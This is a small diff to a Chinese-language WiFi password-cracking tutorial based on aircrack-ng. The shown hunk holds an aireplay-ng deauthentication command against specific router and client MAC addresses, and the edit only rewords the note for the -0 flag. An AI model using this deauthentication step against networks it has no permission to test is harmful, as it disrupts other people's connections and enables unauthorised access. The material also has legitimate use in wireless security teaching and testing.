@@ -72,7 +72,7 @@ WiFi密码破解主要是利用Linux下的aircrack工具。由于虚拟机不使
 	`aireplay‐ng ‐0 10 ‐a 90:76:9F:81:C8:9A ‐c 42:C7:0A:57:0B:E4 wlan0mon`
 
 		参数说明：
-			-0、–deauth：指定对目标进行攻击的次数
+			-0：指定对目标进行攻击的次数
 			-a：路由器的MAC地址
 			-c：目标MAC地址
 ![](9.png)
